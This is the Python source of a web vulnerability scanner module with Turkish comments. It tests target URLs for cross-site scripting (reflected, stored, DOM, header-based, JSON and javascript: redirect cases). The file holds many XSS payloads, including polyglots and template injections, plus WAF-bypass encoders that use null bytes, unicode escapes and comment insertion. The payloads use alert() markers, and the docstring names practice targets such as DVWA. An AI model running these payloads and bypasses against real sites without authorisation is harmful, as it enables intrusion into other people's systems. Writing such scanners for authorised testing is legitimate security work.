#!/usr/bin/env python3
"""
Maxima Cog: XSS Scanner — v2 (Kurumsal Seviye)

Teknikler:
  - Yansıtılan (Reflected) XSS — unique marker + HTML decode doğrulama
  - DOM XSS kaynak tespiti (innerHTML, document.write, location.hash analizi)
  - Stored XSS aday tespiti (kayıt + geri okuma akışı)
  - Attribute enjeksiyonu (", ', ` context kırma)
  - JavaScript context enjeksiyonu (</script> ile context kaçışı)
  - CSS / Style enjeksiyonu (expression, import)
  - Polyglot payload'lar
  - WAF bypass teknikleri (encoding, case, comment, unicode, hex)
  - Content-Security-Policy başlık analizi
  - HTTP Response header enjeksiyonu (X-Forwarded-For, Referer)
  - Form POST enjeksiyonu
  - JSON yanıt içi XSS (API endpoint'leri)
  - Parametre keşfi: URL, form, hidden, data-* attribute
  - Bağlam tespiti (HTML/attr/script/style context)
  - Gerçek hedef: DVWA, bWAPP, WebGoat uyumlu test akışı
"""

import re
import html
import time
import json
import random
import string
import urllib.parse
from typing import Dict, List, Optional, Tuple, Set
from utils.base_module import BaseModule, ModuleResult

# ── Reflected XSS payload'ları ───────────────────────────────
# Format: (template, confirm_regex, context, açıklama)
REFLECTED_PAYLOADS: List[Tuple[str, str, str, str]] = [
    # HTML context — script tag
    ('<script>alert("XSS_{M}")</script>',
     r'<script>alert\("XSS_{M}"\)</script>',
     "html", "Script tag"),
    ('<SCRIPT>alert("XSS_{M}")</SCRIPT>',
     r'alert\("XSS_{M}"\)',
     "html", "Script tag (uppercase)"),
    ('<script >alert("XSS_{M}")</script >',
     r'alert\("XSS_{M}"\)',
     "html", "Script tag (space)"),
    ('<scr<script>ipt>alert("XSS_{M}")</scr</script>ipt>',
     r'alert\("XSS_{M}"\)',
     "html", "Nested script bypass"),

    # HTML context — event handlers
    ('"><img src=x onerror=alert("XSS_{M}")>',
     r'onerror=alert\("XSS_{M}"\)',
     "html", "Img onerror"),
    ('"><img src=x onerror="alert(\'XSS_{M}\')">',
     r"onerror=.alert\('XSS_{M}'\)",
     "html", "Img onerror (single quote)"),
    ('<svg onload=alert("XSS_{M}")>',
     r'onload=alert\("XSS_{M}"\)',
     "html", "SVG onload"),
    ('<svg/onload=alert("XSS_{M}")>',
     r'onload=alert\("XSS_{M}"\)',
     "html", "SVG/onload"),
    ('<body onload=alert("XSS_{M}")>',
     r'onload=alert\("XSS_{M}"\)',
     "html", "Body onload"),
    ('<details open ontoggle=alert("XSS_{M}")>',
     r'ontoggle=alert\("XSS_{M}"\)',
     "html", "Details ontoggle"),
    ('<iframe onload=alert("XSS_{M}")>',
     r'onload=alert\("XSS_{M}"\)',
     "html", "Iframe onload"),
    ('<input autofocus onfocus=alert("XSS_{M}")>',
     r'onfocus=alert\("XSS_{M}"\)',
     "html", "Input autofocus onfocus"),
    ('<video><source onerror=alert("XSS_{M}")>',
     r'onerror=alert\("XSS_{M}"\)',
     "html", "Video source onerror"),
    ('<math><mtext></table></math><img src=x onerror=alert("XSS_{M}")>',
     r'onerror=alert\("XSS_{M}"\)',
     "html", "MathML bypass"),
    ('<object data="javascript:alert(\'XSS_{M}\')">',
     r'javascript:alert',
     "html", "Object data javascript"),

    # Attribute context — context kırma
    ('" onmouseover="alert(\'XSS_{M}\')"',
     r'onmouseover=.alert',
     "attr", "Attribute double-quote break"),
    ("' onmouseover='alert(\"XSS_{M}\")'",
     r"onmouseover=.alert",
     "attr", "Attribute single-quote break"),
    ("` onmouseover=`alert('XSS_{M}')`",
     r"onmouseover",
     "attr", "Attribute backtick break"),
    ('" autofocus onfocus="alert(\'XSS_{M}\')"',
     r"onfocus",
     "attr", "Attribute onfocus"),
    ('" onblur="alert(\'XSS_{M}\')" x="',
     r"onblur",
     "attr", "Attribute onblur"),
    ('" tabindex="1" onfocus="alert(\'XSS_{M}\')"',
     r"onfocus",
     "attr", "Attribute tabindex onfocus"),

    # JavaScript context — string break
    ("';alert('XSS_{M}')//",
     r"alert\('XSS_{M}'\)",
     "js", "JS single-quote string break"),
    ('";alert("XSS_{M}")//\n',
     r'alert\("XSS_{M}"\)',
     "js", "JS double-quote string break"),
    ("</script><script>alert('XSS_{M}')</script>",
     r"alert\('XSS_{M}'\)",
     "js", "Script block escape"),
    ("\\'; alert('XSS_{M}')//",
     r"alert",
     "js", "JS backslash escape"),

    # CSS / style context
    ('<style>body{background:url("javascript:alert(\'XSS_{M}\')")}</style>',
     r'javascript:alert',
     "css", "CSS body background"),
    ('<div style="background:url(javascript:alert(\'XSS_{M}\'))">',
     r'javascript:alert',
     "css", "Inline style javascript URL"),

    # Polyglot
    ("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS_{M}') )//%0D%0A%0d%0a//</style></Title></script>",
     r"onclick=alert",
     "polyglot", "Polyglot"),
    ("'\"--><img src=x onerror=alert('XSS_{M}')>",
     r"onerror=alert",
     "polyglot", "Quote break polyglot"),

    # Template injection XSS
    ("{{constructor.constructor('alert(\"XSS_{M}\")')()}}",
     r"constructor",
     "template", "AngularJS template injection"),
    ("${alert('XSS_{M}')}",
     r"alert\('XSS_{M}'\)",
     "template", "Template literal injection"),
]

# ── WAF bypass encoding fonksiyonları ────────────────────────
WAF_BYPASS_ENCODERS = [
    # HTML entity encoding
    lambda p: p.replace("<", "&lt;").replace(">", "&gt;"),
    # URL encoding
    lambda p: urllib.parse.quote(p, safe=""),
    # Double URL encoding
    lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""),
    # Case variation
    lambda p: p.replace("alert", "Alert").replace("SCRIPT", "Script").replace("onerror", "onError"),
    # Null byte injection
    lambda p: p.replace("<script>", "<scr\x00ipt>"),
    # Unicode escape (JS context)
    lambda p: p.replace("alert", "\\u0061\\u006c\\u0065\\u0072\\u0074"),
    # Hex encoding
    lambda p: p.replace("alert", "\\x61\\x6c\\x65\\x72\\x74"),
    # Comment injection
    lambda p: p.replace("script", "scr/**/ipt").replace("alert", "al/**/ert"),
    # Tab/newline injection
    lambda p: p.replace(" ", "\t").replace("=", "=\n"),
    # SVG namespace bypass
    lambda p: p.replace("<script>", "<svg><script>").replace("</script>", "</script></svg>"),
]

# ── DOM XSS kaynak/sink imzaları ─────────────────────────────
DOM_SOURCES = [
    "location.hash", "location.search", "location.href",
    "document.referrer", "document.URL", "document.documentURI",
    "window.name", "history.state",
    "location.pathname",
]
DOM_SINKS = [
    "innerHTML", "outerHTML", "document.write", "document.writeln",
    "insertAdjacentHTML", "eval(", "setTimeout(", "setInterval(",
    "Function(", "execScript", "location.href =", "location =",
    "location.replace(", "location.assign(",
    "src =", "href =", "action =",
]

# ── Stored XSS payload'ları ───────────────────────────────────
STORED_PAYLOADS = [
    '<script>alert("STORED_{M}")</script>',
    '"><img src=x onerror=alert("STORED_{M}")>',
    '<svg onload=alert("STORED_{M}")>',
    "';alert('STORED_{M}')//",
    '<iframe src="javascript:alert(\'STORED_{M}\')">',
]

# ── CSP bypass teknikler ──────────────────────────────────────
CSP_BYPASS_INDICATORS = [
    "unsafe-inline",
    "unsafe-eval",
    "data:",
    "blob:",
    "'none'",  # eksik değil ama sıkı
    "*.googleapis.com",  # JSONP bypass
    "*.google.com",
    "cdn.jsdelivr.net",  # CDN bypass
]

# ── DOM XSS aday parametre isimleri ──────────────────────────
DOM_CANDIDATE_PARAMS = [
    "callback", "redirect", "url", "next", "return", "target",
    "redir", "goto", "back", "destination", "continue", "ref",
    "referrer", "out", "jump", "to", "link", "from",
]

# ── Bağlam tespit regex'leri ─────────────────────────────────
CONTEXT_PATTERNS = {
    "html":  re.compile(r'<[^>]*MAXCTX[^>]*>|MAXCTX(?!</)', re.I),
    "attr":  re.compile(r'(?:value|placeholder|title|alt|data-[^=]*)=["\'][^"\']*MAXCTX', re.I),
    "script": re.compile(r'(?:var|let|const|=)\s*["\']?[^"\';\n]*MAXCTX', re.I),
    "style": re.compile(r'(?:style|css)[^>]*MAXCTX', re.I),
}


def _make_marker() -> str:
    return "".join(random.choices(string.digits, k=6))


def _analyze_csp(headers: Dict) -> Tuple[bool, List[str]]:
    """CSP başlığını analiz et. (bypass_possible, issues)"""
    csp = ""
    for k, v in headers.items():
        if k.lower() in ("content-security-policy", "x-content-security-policy"):
            csp = v
            break
    if not csp:
        return True, ["CSP başlığı yok — XSS çalıştırılabilir"]
    issues = []
    for indicator in CSP_BYPASS_INDICATORS:
        if indicator in csp:
            issues.append(f"CSP zayıflık: '{indicator}'")
    return bool(issues), issues


class XSSScanner(BaseModule):
    """XSS Scanner v2 — Reflected/DOM/Stored/WAF-bypass/CSP analizi"""

    def run(self) -> ModuleResult:
        self.log("XSS taraması v2 başlatılıyor...", "info")
        self.log("Reflected, DOM, Stored, Attr-context, JS-context, WAF-bypass, CSP", "info")

        findings_before = len(self.results["findings"])

        # 1. Parametre keşfi
        params = self._discover_params()
        self.log(f"{len(params)} parametre keşfedildi", "info")

        # 2. CSP analizi
        self._analyze_csp_header()

        # 3. Reflected XSS (her parametre için)
        reflected_found = 0
        for param, default_val, param_type in params[:12]:
            self.log(f"  [→] Reflected XSS: {param} ({param_type})", "info")
            hits = self._test_reflected(param, default_val, param_type)
            reflected_found += hits

        # 4. DOM XSS analizi
        self._test_dom_xss()

        # 5. Stored XSS aday tespiti
        self._test_stored_xss(params)

        # 6. Header tabanlı XSS
        self._test_header_xss()

        # 7. JSON response XSS
        self._test_json_xss()

        # 8. Open redirect + XSS (javascript: scheme)
        self._test_javascript_scheme()

        total = len(self.results["findings"]) - findings_before
        self.results["summary"].update({
            "Taranan Parametre": len(params),
            "Reflected XSS":     reflected_found,
            "Toplam Bulgu":      total,
            "Teknikler":         "Reflected/DOM/Stored/Attr/JS/CSS/Polyglot/WAF/CSP/Header/JSON",
        })
        return self.results

    # ── Parametre keşfi ──────────────────────────────────────
    def _discover_params(self) -> List[Tuple[str, str, str]]:
        """(param_name, default_value, type) listesi döner. type: url|form|data"""
        params: List[Tuple[str, str, str]] = []
        seen: Set[str] = set()

        def add(name: str, val: str, ptype: str):
            skip = {"submit", "csrf", "_token", "nonce", "__viewstate",
                    "password", "pass", "pw", "action", "method"}
            if name and name.lower() not in skip and name not in seen:
                seen.add(name)
                params.append((name, val or "test", ptype))

        # URL query string
        parsed = urllib.parse.urlparse(self.url)
        for k, v in urllib.parse.parse_qsl(parsed.query):
            add(k, v, "url")

        # HTML form analizi
        try:
            resp = self.http_get(self.url)
            body = resp.get("body", "")

            # input name= + value=
            for m in re.finditer(
                r'<input[^>]+name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?',
                body, re.I
            ):
                add(m.group(1), m.group(2) or "test", "form")

            # textarea
            for m in re.finditer(r'<textarea[^>]+name=["\']([^"\']+)["\']', body, re.I):
                add(m.group(1), "test", "form")

            # select
            for m in re.finditer(r'<select[^>]+name=["\']([^"\']+)["\']', body, re.I):
                add(m.group(1), "1", "form")

            # data-* attributes
            for m in re.finditer(r'data-(?:param|field|name)=["\']([^"\']+)["\']', body, re.I):
                add(m.group(1), "test", "data")

        except Exception:
            pass

        # Standart fuzzing parametreleri
        for p in ["q", "search", "name", "id", "input", "query", "s", "msg",
                  "comment", "text", "content", "title", "description", "page",
                  "keyword", "term", "filter", "tag", "cat", "category"]:
            add(p, "test", "fuzz")

        return params

    # ── CSP analizi ──────────────────────────────────────────
    def _analyze_csp_header(self):
        try:
            resp = self.http_get(self.url)
            headers = {k.lower(): v for k, v in resp.get("headers", {}).items()}

            csp = (headers.get("content-security-policy", "") or
                   headers.get("x-content-security-policy", ""))

            if not csp:
                self.add_finding(
                    "CSP Başlığı Eksik",
                    "Content-Security-Policy başlığı yok — XSS'e karşı ek koruma yok",
                    "medium"
                )
                return

            issues = []
            if "unsafe-inline" in csp:
                issues.append("unsafe-inline: inline script çalıştırılabilir")
            if "unsafe-eval" in csp:
                issues.append("unsafe-eval: eval() çalıştırılabilir")
            if "'none'" not in csp and "default-src" not in csp:
                issues.append("default-src direktifi eksik")
            for cdn in ["googleapis.com", "jsdelivr.net", "unpkg.com"]:
                if cdn in csp:
                    issues.append(f"{cdn} JSONP bypass riski")
            if "data:" in csp:
                issues.append("data: URI payload taşıyabilir")

            if issues:
                self.add_finding(
                    "CSP Zayıf Yapılandırma",
                    f"CSP bulundu ama bypass edilebilir: {'; '.join(issues[:3])}",
                    "medium"
                )
            else:
                self.log("  CSP güçlü görünüyor", "success")

            # X-Frame-Options / Clickjacking
            if "x-frame-options" not in headers:
                self.add_finding(
                    "X-Frame-Options Eksik",
                    "Clickjacking tabanlı XSS kombinasyon saldırısı mümkün",
                    "low"
                )

        except Exception:
            pass

    # ── Reflected XSS ────────────────────────────────────────
    def _test_reflected(self, param: str, default_val: str, param_type: str) -> int:
        """Parametreye reflected XSS testleri. Döner: bulgu sayısı."""
        found = 0

        # Baseline
        try:
            baseline_resp = self._inject_param(param, "MAXIMA_BASELINE_" + _make_marker(), param_type)
            baseline_body = baseline_resp.get("body", "")
        except Exception:
            baseline_body = ""

        # Bağlam tespiti (hızlı)
        detected_ctx = self._detect_context(param, param_type, baseline_body)

        # Payload seçimi: bağlama göre öncelikli
        ordered_payloads = self._prioritize_payloads(detected_ctx)

        for raw_tpl, confirm_re_tpl, ctx, desc in ordered_payloads:
            marker = _make_marker()
            payload = raw_tpl.replace("{M}", marker)
            confirm_re = confirm_re_tpl.replace("{M}", marker)

            try:
                resp = self._inject_param(param, payload, param_type)
                body = resp.get("body", "")
                decoded = html.unescape(body)
                status = resp.get("status", 0)

                if not body or status == 0:
                    continue

                # En güçlü: regex tam eşleşmesi
                for b in (body, decoded):
                    if re.search(confirm_re, b, re.I | re.S):
                        severity = "high" if ctx in ("html", "js", "polyglot") else "medium"
                        self.add_finding(
                            f"XSS — Reflected ({desc})",
                            f"Param:{param} | Bağlam:{ctx} | Payload:{payload[:80]}",
                            severity
                        )
                        self.log(f"[{severity.upper()}] Reflected XSS: {param} ({desc})", "finding")
                        found += 1
                        # WAF bypass ile de dene
                        self._try_waf_bypass(param, payload, param_type, ctx, desc)
                        return found  # parametre başına ilk bulgu yeter

                # Orta güven: payload baseline'da yok ama body'de var
                if (payload[:20].lower() in body.lower() and
                        payload[:20].lower() not in baseline_body.lower()):
                    self.add_finding(
                        f"XSS Olası — Reflected ({desc}) (Doğrulama Gerekli)",
                        f"Param:{param} | Payload yansıdı, execute doğrulanamadı | {payload[:80]}",
                        "low"
                    )
                    found += 1
                    return found

            except Exception:
                continue

        # WAF bypass — orijinal payload'larla da dene
        if found == 0:
            found += self._try_waf_bypass_bulk(param, param_type)

        return found

    def _inject_param(self, param: str, payload: str, param_type: str) -> Dict:
        """Payload'ı uygun yönteme göre enjekte et (GET/POST form)."""
        if param_type == "form":
            # POST form
            form_action = self._find_form_action()
            if form_action:
                data = urllib.parse.urlencode({param: payload}).encode()
                return self.http_post(form_action, data=data, headers={
                    "Content-Type": "application/x-www-form-urlencoded"
                })

        # GET (url/fuzz/data)
        parsed = urllib.parse.urlparse(self.url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param] = payload
        new_url = parsed._replace(query=urllib.parse.urlencode(qs)).geturl()
        if not parsed.query:
            new_url = self.url.rstrip("?") + "?" + urllib.parse.urlencode({param: payload})
        return self.http_get(new_url)

    def _find_form_action(self) -> Optional[str]:
        try:
            body = self.http_get(self.url).get("body", "")
            m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', body, re.I)
            if m:
                action = m.group(1)
                if not action.startswith("http"):
                    p = urllib.parse.urlparse(self.url)
                    action = f"{p.scheme}://{p.netloc}{action}"
                return action
        except Exception:
            pass
        return None

    def _detect_context(self, param: str, param_type: str, baseline_body: str) -> str:
        """Parametrenin HTML içindeki bağlamını tespit et."""
        ctx_probe = "MAXCTX" + _make_marker()
        try:
            resp = self._inject_param(param, ctx_probe, param_type)
            body = resp.get("body", "")
            if not body:
                return "html"

            # Script context
            script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', body, re.S | re.I)
            for block in script_blocks:
                if ctx_probe in block:
                    return "script"

            # Style context
            style_blocks = re.findall(r'<style[^>]*>(.*?)</style>', body, re.S | re.I)
            for block in style_blocks:
                if ctx_probe in block:
                    return "style"

            # Attribute context
            attr_match = re.search(
                r'(?:value|placeholder|title|alt|href|src|data-[^=]*)=["\'][^"\']*' + ctx_probe,
                body, re.I
            )
            if attr_match:
                return "attr"

        except Exception:
            pass
        return "html"

    def _prioritize_payloads(self, ctx: str) -> List[Tuple]:
        """Bağlama göre payload listesini sırala."""
        ctx_map = {
            "script": ["js", "polyglot"],
            "style":  ["css", "polyglot"],
            "attr":   ["attr", "html", "polyglot"],
            "html":   ["html", "polyglot", "attr", "js"],
        }
        priority_ctxs = ctx_map.get(ctx, ["html", "polyglot", "attr", "js"])
        ordered = []
        for pctx in priority_ctxs:
            ordered += [p for p in REFLECTED_PAYLOADS if p[2] == pctx]
        # Geri kalanları ekle
        ordered += [p for p in REFLECTED_PAYLOADS if p not in ordered]
        return ordered

    def _try_waf_bypass(self, param: str, original_payload: str, param_type: str,
                         ctx: str, desc: str) -> int:
        """Bulunan payload'ı WAF bypass teknikleriyle de dene."""
        found = 0
        for enc_fn in WAF_BYPASS_ENCODERS[:5]:
            try:
                bypassed = enc_fn(original_payload)
                resp = self._inject_param(param, bypassed, param_type)
                body = resp.get("body", "")
                if re.search(r'alert|onerror|onload|javascript:', body, re.I):
                    self.add_finding(
                        f"XSS WAF Bypass — {desc}",
                        f"Param:{param} | Bypass payload: {bypassed[:80]}",
                        "high"
                    )
                    found += 1
                    break
            except Exception:
                continue
        return found

    def _try_waf_bypass_bulk(self, param: str, param_type: str) -> int:
        """İlk 5 payload × 5 encoding kombinasyonu — WAF bypass."""
        base_payloads = REFLECTED_PAYLOADS[:5]
        found = 0
        for raw_tpl, _, ctx, desc in base_payloads:
            marker = _make_marker()
            payload = raw_tpl.replace("{M}", marker)
            for enc_fn in WAF_BYPASS_ENCODERS[:5]:
                try:
                    bypassed = enc_fn(payload)
                    resp = self._inject_param(param, bypassed, param_type)
                    body = html.unescape(resp.get("body", ""))
                    if re.search(r'alert\(' + marker + r'\)', body, re.I):
                        self.add_finding(
                            f"XSS WAF Bypass (Encoded) — {desc}",
                            f"Param:{param} | Encoded payload doğrulandı",
                            "high"
                        )
                        found += 1
                        return found
                except Exception:
                    continue
        return found

    # ── DOM XSS ──────────────────────────────────────────────
    def _test_dom_xss(self):
        """JS kaynak kodu analizi — source → sink zinciri."""
        try:
            resp = self.http_get(self.url)
            body = resp.get("body", "")

            found_sources = [s for s in DOM_SOURCES if s in body]
            found_sinks = [s for s in DOM_SINKS if s in body]

            if found_sources and found_sinks:
                self.add_finding(
                    "DOM XSS — Source→Sink Zinciri Tespit Edildi (Statik Analiz)",
                    f"Kaynaklar: {', '.join(found_sources[:3])} | Sinkler: {', '.join(found_sinks[:3])} | Manuel doğrulama önerilir",
                    "medium"
                )
                self.log(f"[MEDIUM] DOM XSS (statik): {found_sources[:2]} → {found_sinks[:2]}", "finding")
            elif found_sources:
                self.add_finding(
                    "DOM XSS Kaynağı Tespit Edildi (Sink Yok — Düşük Risk)",
                    f"Kaynaklar: {', '.join(found_sources[:3])}",
                    "low"
                )
            elif found_sinks:
                self.add_finding(
                    "DOM XSS Sinki Tespit Edildi (Manuel Doğrulama Gerekli)",
                    f"Sinkler: {', '.join(found_sinks[:3])}",
                    "medium"
                )

            # location.hash → DOM XSS (sık görülen)
            if "location.hash" in body and (
                "innerHTML" in body or "document.write" in body
            ):
                self.add_finding(
                    "DOM XSS — location.hash → innerHTML (Statik Analiz)",
                    "location.hash değeri innerHTML veya document.write'a iletiliyor — manuel doğrulama gerekli",
                    "medium"
                )

            # Inline script JSON injection
            json_matches = re.findall(r'var\s+\w+\s*=\s*(\{[^;]{10,500}\})', body)
            for jm in json_matches[:3]:
                if "location" in jm or "hash" in jm or "search" in jm:
                    self.add_finding(
                        "DOM XSS — Inline JSON ile URL Parametre Kullanımı",
                        f"Inline JS JSON verisi URL parametrelerine erişiyor: {jm[:80]}",
                        "medium"
                    )
                    break

            # JS dosyalarını analiz et
            js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']',
                                  body, re.I)
            for js_url in js_urls[:5]:
                self._analyze_js_file(js_url)

        except Exception:
            pass

    def _analyze_js_file(self, js_url: str):
        """Harici JS dosyasında DOM XSS kaynak/sink ara."""
        try:
            if not js_url.startswith("http"):
                parsed = urllib.parse.urlparse(self.url)
                js_url = f"{parsed.scheme}://{parsed.netloc}/{js_url.lstrip('/')}"
            resp = self.http_get(js_url)
            js_body = resp.get("body", "")
            if not js_body:
                return
            found_sources = [s for s in DOM_SOURCES if s in js_body]
            found_sinks = [s for s in DOM_SINKS if s in js_body]
            if found_sources and found_sinks:
                self.add_finding(
                    f"DOM XSS — JS Dosyasında Source→Sink",
                    f"Dosya: {js_url.split('/')[-1][:40]} | "
                    f"Kaynak: {found_sources[0]} | Sink: {found_sinks[0]}",
                    "high"
                )
        except Exception:
            pass

    # ── Stored XSS ───────────────────────────────────────────
    def _test_stored_xss(self, params: List[Tuple[str, str, str]]):
        """Form'a payload kaydet, sayfayı tekrar oku ve yansıma kontrolü."""
        form_params = [(p, v, t) for p, v, t in params if t == "form"]
        if not form_params:
            self.log("  Stored XSS: kayıt formu bulunamadı, atlanıyor", "info")
            return

        marker = _make_marker()
        for raw_pl in STORED_PAYLOADS[:3]:
            payload = raw_pl.replace("{M}", marker)
            try:
                # Payload'ı POST ile gönder
                form_data = {p: payload for p, _, _ in form_params[:3]}
                form_data["submit"] = "1"
                encoded = urllib.parse.urlencode(form_data).encode()
                action = self._find_form_action() or self.url
                self.http_post(action, data=encoded, headers={
                    "Content-Type": "application/x-www-form-urlencoded"
                })

                # Sayfayı tekrar oku — payload yansıdı mı?
                time.sleep(0.3)
                resp = self.http_get(self.url)
                body = resp.get("body", "")
                if marker in body:
                    decoded = html.unescape(body)
                    # Çalışan payload mı yoksa encode edilmiş mi?
                    if re.search(r'onerror=|onload=|<script', body, re.I) and marker in body:
                        self.add_finding(
                            "XSS — Stored (Kalıcı) XSS!",
                            f"Payload kayıt edildi ve çalıştırılabilir halde yansıdı | "
                            f"Marker:{marker} | Payload:{payload[:60]}",
                            "critical"
                        )
                        self.log(f"[CRITICAL] Stored XSS! Marker:{marker}", "finding")
                    else:
                        self.add_finding(
                            "XSS Olası — Stored (Encode edilmiş, Doğrulama Gerekli)",
                            f"Marker yansıdı ama encode edilmiş olabilir | Marker:{marker}",
                            "medium"
                        )
                    return  # İlk bulgu yeterli

            except Exception:
                continue

    # ── Header XSS ───────────────────────────────────────────
    def _test_header_xss(self):
        """HTTP başlıkları üzerinden XSS — Referer, User-Agent."""
        marker = _make_marker()
        payloads = [
            f'<script>alert("XSS_{marker}")</script>',
            f'"><img src=x onerror=alert("XSS_{marker}")>',
        ]
        headers_to_test = {
            "Referer":        f"https://evil.com/<script>alert('XSS_{marker}')</script>",
            "User-Agent":     f"Mozilla<script>alert('XSS_{marker}')</script>",
            "X-Forwarded-For": f"127.0.0.1<script>alert('XSS_{marker}')</script>",
        }
        try:
            baseline_body = self.http_get(self.url).get("body", "")
            for header_name, payload in headers_to_test.items():
                resp = self.http_get(self.url, headers={header_name: payload})
                body = resp.get("body", "")
                if marker in body and marker not in baseline_body:
                    decoded = html.unescape(body)
                    if re.search(r'<script|onerror=|onload=', decoded, re.I):
                        self.add_finding(
                            f"XSS — HTTP Header ({header_name})",
                            f"Header değeri yansıtıldı ve execute edilebilir | Marker:{marker}",
                            "high"
                        )
                        self.log(f"[HIGH] Header XSS: {header_name}", "finding")
        except Exception:
            pass

    # ── JSON response XSS ────────────────────────────────────
    def _test_json_xss(self):
        """JSON API yanıtlarında XSS — Content-Type text/html olduğunda tehlikeli."""
        marker = _make_marker()
        xss_payload = f'<img src=x onerror=alert("XSS_{marker}")>'
        json_endpoints = ["/api/", "/api/v1/", "/api/search", "/search.json", "/data"]
        params = ["q", "search", "query", "name", "id"]

        for endpoint in json_endpoints:
            for param in params[:3]:
                try:
                    url = (urllib.parse.urlparse(self.url).scheme + "://" +
                           urllib.parse.urlparse(self.url).netloc +
                           endpoint + f"?{param}=" + urllib.parse.quote(xss_payload))
                    resp = self.http_get(url)
                    body = resp.get("body", "")
                    ct = resp.get("headers", {}).get("content-type", "").lower()
                    if marker in body and "text/html" in ct:
                        self.add_finding(
                            "XSS — JSON Endpoint HTML Content-Type",
                            f"Endpoint:{endpoint} Param:{param} | "
                            f"JSON yanıtı text/html döndürüyor ve payload yansıdı",
                            "high"
                        )
                        return
                    elif marker in body and "application/json" in ct:
                        self.add_finding(
                            "XSS Aday — JSON Payload Yansıması (Sanitasyon Eksik)",
                            f"Endpoint:{endpoint} | JSON'da ham payload var — "
                            f"SPA renderer'ı varsa tehlikeli",
                            "low"
                        )
                except Exception:
                    continue

    # ── javascript: scheme (open redirect XSS) ───────────────
    def _test_javascript_scheme(self):
        """Redirect/URL parametrelerine javascript: scheme enjekte et."""
        marker = _make_marker()
        js_payload = f"javascript:alert('XSS_{marker}')"
        try:
            for param in DOM_CANDIDATE_PARAMS[:8]:
                url = (self.url.rstrip("?") + "?" +
                       urllib.parse.urlencode({param: js_payload}))
                resp = self.http_get(url, follow_redirects=False)
                body = resp.get("body", "")
                location = resp.get("headers", {}).get("Location", "")
                if ("javascript:" in body.lower() and marker in body) or \
                   "javascript:" in location:
                    self.add_finding(
                        "XSS — Open Redirect javascript: Scheme",
                        f"Param:{param} | javascript: payload redirect veya sayfada yansıdı",
                        "high"
                    )
                    self.log(f"[HIGH] javascript: scheme XSS: {param}", "finding")
                    return
        except Exception:
            pass
